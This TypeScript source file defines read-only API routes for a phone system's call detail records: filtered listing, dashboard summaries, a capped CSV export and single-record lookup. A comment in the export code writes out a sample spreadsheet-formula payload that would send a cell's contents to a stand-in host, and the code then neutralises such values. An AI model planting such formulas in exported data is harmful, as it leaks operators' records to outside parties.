/**
 * Call history, read-only.
 *
 * No write routes at all. CDRs are a record of what happened, and a phone system whose billing
 * history can be edited through its own API is not one anyone should buy - correcting a record
 * is a support action against the database, deliberately outside the normal path.
 */
import { Hono } from "hono";
import {
  and,
  count,
  desc,
  eq,
  gte,
  ilike,
  lte,
  or,
  sql,
  type SQL,
} from "drizzle-orm";
import { db } from "../db";
import { cdr, extension, trunk } from "../db/schema";
import {
  requirePermission,
  requireTenant,
  type AppEnv,
} from "../middleware/tenant";

export const cdrs = new Hono<AppEnv>();
cdrs.use("*", requireTenant);
/* List and summary need cdr:read. Export adds cdr:export on its own route so viewer and member
   (who have read but not export) are refused — that distinction is why the action exists. */
cdrs.use("*", requirePermission("cdr", "read"));

const MAX_LIMIT = 200;
const MAX_EXPORT = 10_000;

/** Rejects a date that would silently become "now" or an Invalid Date in a range filter. */
function parseDate(value: string | undefined): Date | null | "invalid" {
  if (!value) return null;
  const d = new Date(value);
  return Number.isNaN(d.getTime()) ? "invalid" : d;
}

/**
 * Shared filter builder for list and export. One place to add a filter, so export cannot
 * quietly ignore one the list honours.
 *
 * Returns either the filter array or a Response to send (validation error).
 */
function buildFilters(
  q: Record<string, string>,
  organizationId: string,
):
  | { filters: SQL[]; error?: undefined }
  | { filters?: undefined; error: Response } {
  const from = parseDate(q.from);
  const to = parseDate(q.to);
  if (from === "invalid" || to === "invalid") {
    return {
      error: Response.json(
        { error: "from and to must be parseable dates" },
        { status: 400 },
      ),
    };
  }

  // organizationId first and unconditionally. Every other clause is optional; this one is the
  // isolation boundary and must not be reachable through any code path that omits it.
  const filters: SQL[] = [eq(cdr.organizationId, organizationId)];

  if (q.direction) {
    if (!["inbound", "outbound", "internal"].includes(q.direction)) {
      return {
        error: Response.json(
          { error: "direction must be inbound, outbound or internal" },
          { status: 400 },
        ),
      };
    }
    filters.push(
      eq(cdr.direction, q.direction as "inbound" | "outbound" | "internal"),
    );
  }
  if (q.extensionId) filters.push(eq(cdr.extensionId, q.extensionId));
  if (from) filters.push(gte(cdr.startedAt, from));
  if (to) filters.push(lte(cdr.startedAt, to));
  if (q.answered === "true") filters.push(sql`${cdr.answeredAt} is not null`);
  if (q.answered === "false") filters.push(sql`${cdr.answeredAt} is null`);

  if (q.number) {
    /* Drizzle parameterises this, so the wildcards are data rather than pattern syntax - but
       an operator searching for a number containing % or _ would still get surprising matches,
       so escape them into literals. */
    const term = `%${q.number.replace(/[\\%_]/g, "\\$&")}%`;
    const numberMatch = or(
      ilike(cdr.callerNumber, term),
      ilike(cdr.destinationNumber, term),
    );
    if (numberMatch) filters.push(numberMatch);
  }

  return { filters };
}

cdrs.get("/", async (c) => {
  const organizationId = c.get("organizationId");
  const q = c.req.query();

  const limit = Math.min(Math.max(Number(q.limit ?? 50) || 50, 1), MAX_LIMIT);
  const offset = Math.max(Number(q.offset ?? 0) || 0, 0);

  const built = buildFilters(q, organizationId);
  if (built.error) return built.error;

  const where = and(...built.filters);

  const rows = await db
    .select({
      id: cdr.id,
      callUuid: cdr.callUuid,
      direction: cdr.direction,
      callerNumber: cdr.callerNumber,
      callerName: cdr.callerName,
      destinationNumber: cdr.destinationNumber,
      startedAt: cdr.startedAt,
      answeredAt: cdr.answeredAt,
      endedAt: cdr.endedAt,
      durationSec: cdr.durationSec,
      billsecSec: cdr.billsecSec,
      hangupCause: cdr.hangupCause,
      attestation: cdr.attestation,
      extensionNumber: extension.number,
      extensionName: extension.displayName,
      trunkName: trunk.name,
    })
    .from(cdr)
    .leftJoin(extension, eq(cdr.extensionId, extension.id))
    .leftJoin(trunk, eq(cdr.trunkId, trunk.id))
    .where(where)
    .orderBy(desc(cdr.startedAt))
    .limit(limit)
    .offset(offset);

  // Total for the same filter set, so the portal can page without guessing.
  const [totals] = await db.select({ total: count() }).from(cdr).where(where);

  return c.json({ rows, total: totals?.total ?? 0, limit, offset });
});

/**
 * Aggregates for the dashboard. A separate endpoint rather than a flag on the list, because the
 * portal wants both at once and computing them from a page of rows would be wrong.
 */
cdrs.get("/summary", async (c) => {
  const organizationId = c.get("organizationId");
  const from = parseDate(c.req.query("from"));
  const to = parseDate(c.req.query("to"));
  if (from === "invalid" || to === "invalid") {
    return c.json({ error: "from and to must be parseable dates" }, 400);
  }

  const filters = [eq(cdr.organizationId, organizationId)];
  if (from) filters.push(gte(cdr.startedAt, from));
  if (to) filters.push(lte(cdr.startedAt, to));

  const [row] = await db
    .select({
      calls: count(),
      answered:
        sql<number>`count(*) filter (where ${cdr.answeredAt} is not null)`.mapWith(
          Number,
        ),
      inbound:
        sql<number>`count(*) filter (where ${cdr.direction} = 'inbound')`.mapWith(
          Number,
        ),
      outbound:
        sql<number>`count(*) filter (where ${cdr.direction} = 'outbound')`.mapWith(
          Number,
        ),
      internal:
        sql<number>`count(*) filter (where ${cdr.direction} = 'internal')`.mapWith(
          Number,
        ),
      billableSec: sql<number>`coalesce(sum(${cdr.billsecSec}), 0)`.mapWith(
        Number,
      ),
    })
    .from(cdr)
    .where(and(...filters));

  const calls = row?.calls ?? 0;
  const answered = row?.answered ?? 0;
  return c.json({
    calls,
    answered,
    // Expressed as a fraction rather than a percentage so the client decides the rounding.
    answerRate: calls > 0 ? answered / calls : null,
    inbound: row?.inbound ?? 0,
    outbound: row?.outbound ?? 0,
    internal: row?.internal ?? 0,
    billableSec: row?.billableSec ?? 0,
  });
});

/**
 * Bulk CSV download. Registered above `/:id` so the path is not swallowed.
 *
 * Caps at MAX_EXPORT and refuses rather than silently truncating — a partial export that looks
 * complete is worse than one that says no.
 */
cdrs.get("/export", requirePermission("cdr", "export"), async (c) => {
  const organizationId = c.get("organizationId");
  const q = c.req.query();

  const built = buildFilters(q, organizationId);
  if (built.error) return built.error;

  const where = and(...built.filters);

  const [totals] = await db.select({ total: count() }).from(cdr).where(where);
  const total = totals?.total ?? 0;
  if (total > MAX_EXPORT) {
    return c.json(
      {
        error: `Export exceeds ${MAX_EXPORT} rows (${total} match)`,
        detail: "Narrow the date range or other filters and try again.",
      },
      400,
    );
  }

  const rows = await db
    .select({
      callUuid: cdr.callUuid,
      direction: cdr.direction,
      callerNumber: cdr.callerNumber,
      callerName: cdr.callerName,
      destinationNumber: cdr.destinationNumber,
      startedAt: cdr.startedAt,
      answeredAt: cdr.answeredAt,
      endedAt: cdr.endedAt,
      durationSec: cdr.durationSec,
      billsecSec: cdr.billsecSec,
      hangupCause: cdr.hangupCause,
      attestation: cdr.attestation,
      extensionNumber: extension.number,
      extensionName: extension.displayName,
      trunkName: trunk.name,
    })
    .from(cdr)
    .leftJoin(extension, eq(cdr.extensionId, extension.id))
    .leftJoin(trunk, eq(cdr.trunkId, trunk.id))
    .where(where)
    .orderBy(desc(cdr.startedAt))
    .limit(MAX_EXPORT);

  const header = [
    "callUuid",
    "direction",
    "callerNumber",
    "callerName",
    "destinationNumber",
    "startedAt",
    "answeredAt",
    "endedAt",
    "durationSec",
    "billsecSec",
    "hangupCause",
    "attestation",
    "extensionNumber",
    "extensionName",
    "trunkName",
  ];

  /**
   * RFC 4180 quoting, plus a formula guard.
   *
   * Excel, LibreOffice and Sheets execute a cell that begins with `=`, `+`, `-`, `@` or a
   * leading tab/CR. `callerName` is `caller_id_name` off the inbound SIP profile
   * (services/cdr.ts), so it is set by whoever placed the call - an inbound caller can name
   * themselves `=HYPERLINK("http://them/"&A1,"x")` and read a row out of an operator's
   * spreadsheet when the export is opened.
   *
   * Prefixing with an apostrophe is the portable neutraliser. Done before quoting, so it ends
   * up inside the quoted field.
   *
   * The carve-out matters on a telephony export: `+14165550100` starts with a guarded character
   * and is a phone number, not a formula, and prefixing every one of them corrupts the column an
   * operator reconciles billing against. A value that is only digits and punctuation after a
   * leading + or - cannot reach anything - a function call needs letters - so arithmetic is the
   * worst it can evaluate to. Anything with a letter in it goes back to being guarded.
   */
  function csvCell(v: unknown): string {
    if (v == null) return "";
    let s = v instanceof Date ? v.toISOString() : String(v);
    const phoneLike = /^[+-][\d\s().-]*$/.test(s);
    if (!phoneLike && /^[=+\-@\t\r]/.test(s)) s = `'${s}`;
    if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
    return s;
  }

  const lines = [header.join(",")];
  for (const r of rows) {
    lines.push(
      [
        r.callUuid,
        r.direction,
        r.callerNumber,
        r.callerName,
        r.destinationNumber,
        r.startedAt,
        r.answeredAt,
        r.endedAt,
        r.durationSec,
        r.billsecSec,
        r.hangupCause,
        r.attestation,
        r.extensionNumber,
        r.extensionName,
        r.trunkName,
      ]
        .map(csvCell)
        .join(","),
    );
  }

  const body = lines.join("\n") + "\n";
  return new Response(body, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="cdr-export.csv"`,
    },
  });
});

cdrs.get("/:id", async (c) => {
  const row = await db.query.cdr.findFirst({
    where: and(
      eq(cdr.id, c.req.param("id")),
      eq(cdr.organizationId, c.get("organizationId")),
    ),
  });
  if (!row) return c.json({ error: "Not found" }, 404);
  return c.json(row);
});
